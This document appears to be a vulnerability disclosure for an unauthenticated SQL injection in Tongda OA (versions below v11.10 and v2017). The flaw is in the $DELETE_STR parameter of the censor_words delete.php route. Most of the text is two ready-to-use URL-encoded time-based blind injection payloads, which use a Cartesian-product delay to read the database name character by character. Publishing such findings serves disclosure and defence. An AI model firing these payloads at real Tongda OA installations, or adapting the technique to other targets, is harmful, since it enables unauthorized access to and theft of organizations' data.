Unauthorized SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017

Route: general/system/censor_words/manage/delete.php

There is an injected parameter: $DELETE_STR

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/Conan0313/cve/assets/144243161/54402503-3331-4e02-827f-5b4d864dd3ef)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/Conan0313/cve/assets/144243161/13daa714-06c8-4fd7-8ac9-744f5eb7b304)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/Conan0313/cve/assets/144243161/1b7f626f-c360-48cc-9a4b-60bc2ee91083)
